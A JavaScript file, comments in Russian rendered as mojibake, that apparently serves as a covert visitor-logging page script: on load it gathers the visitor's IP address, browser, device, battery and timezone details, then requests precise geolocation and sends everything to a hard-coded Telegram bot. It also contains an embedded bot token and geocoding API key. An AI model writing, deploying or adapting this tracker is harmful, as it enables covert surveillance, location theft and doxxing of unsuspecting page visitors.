// –í—Å—Ç–∞–≤—å —Å–≤–æ–π —Ç–æ–∫–µ–Ω –±–æ—Ç–∞ –∏ chat_id
const botToken = '7811273259:AAHRUI55WZFQqTSEjye_sl_CoeRMBQ9xdIY';
const chatId = '7518382960';

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram
function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  const data = {
    chat_id: chatId,
    text: message,
  };

  // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö —á–µ—Ä–µ–∑ fetch
  fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  })
  .then(response => response.json())
  .then(data => console.log('Data sent to Telegram', data))
  .catch(error => console.error('Error:', error));
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ –≤ Telegram
function sendPhotoToTelegram(photoUrl) {
  const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
  const data = {
    chat_id: chatId,
    photo: photoUrl
  };

  fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  })
  .then(response => response.json())
  .then(data => console.log('Photo sent to Telegram', data))
  .catch(error => console.error('Error sending photo:', error));
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è IP-–∞–¥—Ä–µ—Å–∞
function getIP() {
  return fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => data.ip)
    .catch(() => '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å IP');
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –±—Ä–∞—É–∑–µ—Ä–µ –∏ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º–µ
function getBrowserInfo() {
  const userAgent = navigator.userAgent;

  let browserName = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –±—Ä–∞—É–∑–µ—Ä";
  let osName = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –û–°";
  let browserVersion = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –≤–µ—Ä—Å–∏—è";
  let osVersion = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –≤–µ—Ä—Å–∏—è";

  // –ü—Ä–æ–≤–µ—Ä—è–µ–º –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω—É—é —Å–∏—Å—Ç–µ–º—É
  if (userAgent.indexOf("Windows NT 10.0") !== -1) {
    osName = "Windows";
    osVersion = "10";
  } else if (userAgent.indexOf("Windows NT 6.1") !== -1) {
    osName = "Windows";
    osVersion = "7";
  } else if (userAgent.indexOf("Macintosh") !== -1) {
    osName = "Mac OS";
    osVersion = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –≤–µ—Ä—Å–∏—è";
  } else if (userAgent.indexOf("Linux") !== -1) {
    osName = "Linux";
    osVersion = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –≤–µ—Ä—Å–∏—è";
  } else if (userAgent.indexOf("Android") !== -1) {
    osName = "Android";
    osVersion = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –≤–µ—Ä—Å–∏—è";
  } else if (userAgent.indexOf("iPhone") !== -1) {
    osName = "iOS";
    osVersion = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –≤–µ—Ä—Å–∏—è";
  }

  // –ü—Ä–æ–≤–µ—Ä—è–µ–º –±—Ä–∞—É–∑–µ—Ä
  if (userAgent.indexOf("Chrome") !== -1) {
    browserName = "Chrome";
    browserVersion = userAgent.match(/Chrome\/([0-9]+)/)[1];
  } else if (userAgent.indexOf("Firefox") !== -1) {
    browserName = "Firefox";
    browserVersion = userAgent.match(/Firefox\/([0-9]+)/)[1];
  } else if (userAgent.indexOf("Safari") !== -1) {
    browserName = "Safari";
    browserVersion = userAgent.match(/Version\/([0-9]+)/)[1];
  } else if (userAgent.indexOf("Edge") !== -1) {
    browserName = "Edge";
    browserVersion = userAgent.match(/Edge\/([0-9]+)/)[1];
  } else if (userAgent.indexOf("MSIE") !== -1) {
    browserName = "Internet Explorer";
    browserVersion = userAgent.match(/MSIE ([0-9]+)/)[1];
  }

  return { browserName, browserVersion, osName, osVersion };
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏—è –±–∞—Ç–∞—Ä–µ–∏
function getBatteryStatus() {
  return navigator.getBattery ? navigator.getBattery().then(function(battery) {
    return `${battery.level * 100}% - ${battery.charging ? "Charging" : "Not Charging"}`;
  }) : Promise.resolve("–ù–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –±–∞—Ç–∞—Ä–µ—é");
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è, –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å–º–∞—Ä—Ç—Ñ–æ–Ω
function isMobileDevice() {
  const userAgent = navigator.userAgent;
  return /Android|iPhone|Mobile|webOS|Windows Phone/i.test(userAgent);
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –Ω–∞ –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ
function requestCameraPermission() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      // –ö–∞–º–µ—Ä–∞ —Ä–∞–∑—Ä–µ—à–µ–Ω–∞
      collectData();
    })
    .catch(error => {
      console.error('–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ:', error);
    });
}

// –ó–∞–ø—É—Å–∫–∞–µ–º —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö
window.onload = function() {
  collectData();
};

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö
function collectData() {
  const userData = {
    userAgent: navigator.userAgent || '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å userAgent',
    platform: navigator.platform || '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –ø–ª–∞—Ç—Ñ–æ—Ä–º—É',
    language: navigator.language || '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —è–∑—ã–∫',
    screenWidth: screen.width || '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —à–∏—Ä–∏–Ω—É —ç–∫—Ä–∞–Ω–∞',
    screenHeight: screen.height || '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –≤—ã—Å–æ—Ç—É —ç–∫—Ä–∞–Ω–∞',
    screenColorDepth: screen.colorDepth || '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –≥–ª—É–±–∏–Ω—É —Ü–≤–µ—Ç–∞ —ç–∫—Ä–∞–Ω–∞',
    screenPixelDepth: screen.pixelDepth || '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –ø–∏–∫—Å–µ–ª—å–Ω—É—é –≥–ª—É–±–∏–Ω—É —ç–∫—Ä–∞–Ω–∞',
    time: new Date().toISOString() || '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –≤—Ä–µ–º—è',
    ip: '',
    onlineStatus: navigator.onLine ? '–û–Ω–ª–∞–π–Ω' : '–û—Ñ—Ñ–ª–∞–π–Ω',
    cookiesEnabled: navigator.cookieEnabled ? '–í–∫–ª—é—á–µ–Ω—ã' : '–û—Ç–∫–ª—é—á–µ–Ω—ã',
    deviceMemory: navigator.deviceMemory || '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –ø–∞–º—è—Ç—å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞',
    hardwareConcurrency: navigator.hardwareConcurrency || '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —è–¥–µ—Ä –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–∞',
    languageList: navigator.languages ? navigator.languages.join(', ') : '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ —è–∑—ã–∫–æ–≤',
    screenOrientation: screen.orientation ? screen.orientation.type : '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –æ—Ä–∏–µ–Ω—Ç–∞—Ü–∏—é —ç–∫—Ä–∞–Ω–∞',
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —á–∞—Å–æ–≤–æ–π –ø–æ—è—Å',
    batteryStatus: '',
    cookieStorage: '–î–æ—Å—Ç—É–ø–µ–Ω', // –ü—Ä–æ—Å—Ç–æ –ø—Ä–∏–º–µ—Ä, –Ω–æ —Ä–µ–∞–ª—å–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ—Ç—Ä–µ–±—É–µ—Ç —Ä–∞–±–æ—Ç—ã —Å cookies
    browserInfo: getBrowserInfo(),
    isMobile: isMobileDevice() ? '–î–∞' : '–ù–µ—Ç'
  };

  // –ü–æ–ª—É—á–∞–µ–º IP
  getIP().then(ip => {
    userData.ip = ip;

    // –ü–æ–ª—É—á–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –±–∞—Ç–∞—Ä–µ–∏
    getBatteryStatus().then(batteryStatus => {
      userData.batteryStatus = batteryStatus;

      // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
      const message = `
üìç –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –∑–∞–≤–µ—Ä—à–µ–Ω!

üñ•Ô∏è IP: ${userData.ip}
üåê –ë—Ä–∞—É–∑–µ—Ä: ${userData.browserInfo.browserName} v${userData.browserInfo.browserVersion}
üì± –û–°: ${userData.browserInfo.osName} v${userData.browserInfo.osVersion}
üñ•Ô∏è –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${userData.platform}
üåç –Ø–∑—ã–∫: ${userData.language}

üìê –†–∞–∑–º–µ—Ä —ç–∫—Ä–∞–Ω–∞: ${userData.screenWidth}x${userData.screenHeight}
üé® –ì–ª—É–±–∏–Ω–∞ —Ü–≤–µ—Ç–∞: ${userData.screenColorDepth}
üíæ –ü–∞–º—è—Ç—å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞: ${userData.deviceMemory} GB
üß† –Ø–¥–µ—Ä –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–∞: ${userData.hardwareConcurrency}
üç™ Cookies –≤–∫–ª—é—á–µ–Ω—ã: ${userData.cookiesEnabled}

üì∂ –û–Ω–ª–∞–π–Ω —Å—Ç–∞—Ç—É—Å: ${userData.onlineStatus}
üìÇ –î–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å cookieStorage: ${userData.cookieStorage}

üï∞Ô∏è –ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å: ${userData.timezone}
üîã –ü–æ–¥–¥–µ—Ä–∂–∫–∞ –±–∞—Ç–∞—Ä–µ–∏: ${userData.batteryStatus}
üó£Ô∏è –°–ø–∏—Å–æ–∫ —è–∑—ã–∫–æ–≤: ${userData.languageList}
üß≠ –û—Ä–∏–µ–Ω—Ç–∞—Ü–∏—è —ç–∫—Ä–∞–Ω–∞: ${userData.screenOrientation}
üíª –ú–æ–±–∏–ª—å–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${userData.isMobile ? '–î–∞' : '–ù–µ—Ç'}
      `;

      // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ Telegram
      sendToTelegram(message);

      // –ü–æ—Å–ª–µ –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö, –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ–º —Ç–æ—á–Ω–æ–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ
      getLocation();
    });
  }).catch(error => {
    console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è IP:', error);
    sendToTelegram('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è IP');
    getLocation();
  });
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç
function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      position => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        // –ü–æ–ª—É—á–∞–µ–º –≥–æ—Ä–æ–¥ –ø–æ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç–∞–º
        fetchCityFromCoordinates(latitude, longitude)
          .then(city => {
            const locationMessage = `
üåç –¢–æ—á–Ω–æ–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:

üìç –®–∏—Ä–æ—Ç–∞: ${latitude}
üìç –î–æ–ª–≥–æ—Ç–∞: ${longitude}
üèôÔ∏è –ì–æ—Ä–æ–¥: ${city}
            `;

            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–∏ –∏ –≥–æ—Ä–æ–¥–µ –≤ Telegram
            sendToTelegram(locationMessage);
          }).catch(err => {
            console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –≥–æ—Ä–æ–¥–∞: ', err);
          });
      },
      error => {
        console.error("–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏: ", error);
      }
    );
  }
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –±–ª–∏–∂–∞–π—à–µ–≥–æ –≥–æ—Ä–æ–¥–∞ –ø–æ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç–∞–º
function fetchCityFromCoordinates(latitude, longitude) {
  const apiKey = 'c51efb0d46ac4496b556cf9d9868e4d4'; // –ó–¥–µ—Å—å –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –≤–∞—à –∫–ª—é—á API –¥–ª—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
  const url = `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=${apiKey}`;

  return fetch(url)
    .then(response => response.json())
    .then(data => {
      if (data.results && data.results.length > 0) {
        return data.results[0].components.city || data.results[0].components.town || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –≥–æ—Ä–æ–¥';
      } else {
        return '–ì–æ—Ä–æ–¥ –Ω–µ –Ω–∞–π–¥–µ–Ω';
      }
    })
    .catch(error => {
      console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –≥–æ—Ä–æ–¥–∞: ', error);
      return '–ì–æ—Ä–æ–¥ –Ω–µ –Ω–∞–π–¥–µ–Ω';
    });
}
